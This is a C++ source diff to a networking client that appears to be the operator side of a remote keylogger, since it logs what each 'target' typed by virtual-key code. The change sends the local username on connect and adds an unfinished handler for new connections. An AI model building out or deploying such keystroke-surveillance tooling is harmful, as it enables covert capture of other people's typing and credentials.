@@ -24,6 +24,18 @@ client::~client()
 
 void client::networkInitAndLoop()
 {
+	char username[257];
+    DWORD size = 257;
+
+    if (!GetUserNameA(username, &size)) 
+	{
+		strncpy_s(username, 257, "Unknown User", 14);
+		size = 13;
+    }
+	else
+	{
+		--size; // to get rid of null terminator from count
+	}
 	logger.out(KQINFO, { "Connecting to server...\n" });
 	if (!Connect(server_ip, server_port))
 	{
@@ -32,6 +44,11 @@ void client::networkInitAndLoop()
 	}
 	logger.out(KQINFO, { "Successfuly connected to server!\n" });
 	kq::message<messageType> msg(messageType::clientConnected);
+	for(uint32_t i = 0; i < size; ++i)
+	{
+		msg << username[i];
+	}
+	msg << uint32_t(size);
 	Send(msg);
 	while (networkLoop)
 	{
@@ -49,6 +66,12 @@ void client::networkInitAndLoop()
 				msg >> virtualKey;
 
 				logger.out( KQINFO, { "Target {} typed: VK - {}\n", targetID, virtualKey});
+				break;
+			case messageType::newConnection:
+				uint32_t id;
+				uint8_t type;
+				uint32_t size;
+				char name[256];
 				break;
 			default:
 				break;
